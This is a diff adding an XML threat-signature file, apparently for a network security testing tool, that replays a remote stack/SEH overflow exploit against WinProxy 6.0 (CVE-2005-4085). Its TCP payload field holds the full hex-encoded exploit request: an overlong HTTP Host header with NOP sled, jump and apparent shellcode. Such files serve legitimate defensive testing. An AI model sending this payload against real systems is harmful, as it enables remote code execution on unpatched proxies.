@@ -1,0 +1,89 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="WinProxy 6.0  Remote Stack/SEH Overflow Exploit"/>
+    <EngDesc display="true" value="This threat sends a crafted Host field within an HTTP query causing a buffer overflow, and arbitrary execution. WinProxy  is an HTTP proxy  that typically listens on port 80."/>
+    <Intent display="true">
+      <item value="Buffer_Overflow"/>
+      <item value="Crashing"/>
+      <item value="Unauthorized_Access"/>
+      <item value="Unauthorized_Use"/>
+    </Intent>
+    <Protocol display="true" value="HTTP"/>
+    <Type_Of_Equipment display="true">
+      <item value="Application"/>
+    </Type_Of_Equipment>
+    <Known_Vendors_Affected display="true">
+      <item value="Blue_Coat"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="Blue_Coat_WinProxy"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="Blue_Coat_WinProxy_6.0"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value="http://www.idefense.com/intelligence/vulnerabilities/display.php?id=364"/>
+    <CVEID display="true" value="CVE-2005-4085"/>
+    <bugtraqID display="true" value="16147"/>
+    <OSVDB display="true" value="22238"/>
+    <Author display="true" value="Mike Davis"/>
+    <ID display="true" value="00000108bd0333e700c000a80001003c17ae721c"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value="true"/>
+    <ServerSideAttack display="true" value=""/>
+    <SoftwareRevision display="true" value="1.4"/>
+    <Suite display="true" value=""/>
+    <RunOnce display="false" value="false"/>
+    <Valid_Traffic display="false" value="false"/>
+    <AccessVector display="false" value="remote"/>
+    <AccessComplexity display="false" value="low"/>
+    <Authentication display="false" value="not-required"/>
+    <ConfImpact display="false" value="complete"/>
+    <IntegImpact display="false" value="complete"/>
+    <AvailImpact display="false" value="partial"/>
+    <ImpactBias display="false" value="normal"/>
+    <FirstAdded display="false" value=""/>
+    <LastModified display="false" value="632769435330781250"/>
+    <SigStyle display="false" value=""/>
+    <targetNode display="false" value=""/>
+    <SigProtocol display="false" value=""/>
+    <Rate display="false" value=""/>
+    <Regex display="false" value=""/>
+    <Created value="1141449029" display="false"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="sourceMAC" type="ImperfectControls.MacAddress" value="null" index="C"/>
+    <NamedVar name="destMAC" type="ImperfectControls.MacAddress" value="null" index="D"/>
+    <NamedVar name="sourceIP" type="ImperfectControls.IPv4Address" value="null" index="E"/>
+    <NamedVar name="destIP" type="ImperfectControls.IPv4Address" value="null" index="F"/>
+    <NamedVar name="HTTPdestPort" type="ImperfectControls.Port" value="null" index="G"/>
+  </Variables>
+  <Loops>
+    <for index="A">
+      <for index="C"/>
+      <for index="D"/>
+      <for index="E"/>
+      <for index="F"/>
+      <for index="G"/>
+    </for>
+  </Loops>
+  <Output index="A" Count="">
+    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
+      <IP Version="4" InternetHeaderLength="" TypeofService="" TotalLength="" Identification="" FragmentOffset="" TTL="" Protocol="06" HeaderChecksum="" srcIP="$sourceIP" destIP="$destIP" options="" CE="" DF="" MF="">
+        <TCP srcPort="@random(1026, 65535)" destPort="$HTTPdestPort" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="" Checksum="" UrgentPointer="" Options="" Payload="474554202F20485454502F312E300D0A486F73743A203132372E302E302E313A90909090909090909090909090909090909090909090909090EB3240120301909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909031C983E9B0D9EED97424F45B817313268C6DA383EBFCE2F4DAE686EECE75925CD9ECE6CF02A8E6E61A0711A65E8D82286994E6FC068D86EAADB8E6A2C8BDAD3A8A08ADD7214DA7AE274E86571DD8498B5369E6FC028D86C5AD80262879906C4825A0E62A4AA871C2E5BDB6C7ADCF5D286680E6D33A21E6E32ED2052D688281F3D95A0BF040E45E914EFB1E9179D892734E47805F1DDC9275790588C5A76165A173E66F5CF6E4B4AAD3213A5CF0DF3EF075DF2EF065DF927340E47CFF40DFE442B3E4C9B9564B3A5CF0E67DF27373BDCB8221434A7173BBF07373BDCBC3C5EBEA7173BBF372D8385CF61F05445F4A14F4D95A385CF6EA07C740E40ECEAF6907F37FA5A12AC1E6292AC4BDAD508C722F8ED8CE4130ABF655088D2705D1D83F7B5C53C892757DDB3FF277DD07A277DD38F2D95C050EFF89A3F0D95A075CD9BB9273ADDB9120E2E892757473BDCB58548FD07573BB5CF68C6DA30D0A0D0A" CWR="" ECE="" URG="" ACK="" PSH="" RST="" SYN="" FIN="" RES1="" RES2="" RES3="" RES4=""/>
+      </IP>
+    </Ethernet>
+  </Output>
+  <Input>
+    <Ethernet/>
+  </Input>
+  <ServerSide display="1">
+    <Output index="B" Count="">
+      <Ethernet srcMac="" destMac="" pktType="">
+        <IP Version="4" InternetHeaderLength="" TypeofService="" TotalLength="" Identification="" FragmentOffset="" TTL="" Protocol="06" HeaderChecksum="" srcIP="" destIP="" options="" CE="" DF="" MF="">
+          <TCP srcPort="" destPort="" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="" Checksum="" UrgentPointer="" Options="" Payload="485454502f312e3120323030204f4b0d0a5365727665723a204170616368650d0a4c6173742d4d6f6469666965643a204d6f6e2c2030322046656220323030342031313a33323a343120474d540d0a455461673a202261396436652d3830302d33643235636631383534383430220d0a4163636570742d52616e6765733a2062797465730d0a436f6e74656e742d4c656e6774683a20350d0a4b6565702d416c6976653a2074696d656f75743d31352c206d61783d3130300d0a436f6e6e656374696f6e3a204b6565702d416c6976650d0a436f6e74656e742d547970653a20746578742f706c61696e0d0a0d0a50776e5421" CWR="" ECE="" URG="" ACK="" PSH="" RST="" SYN="" FIN="" RES1="" RES2="" RES3="" RES4=""/>
+        </IP>
+      </Ethernet>
+    </Output>
+  </ServerSide>
+</threatSignature>
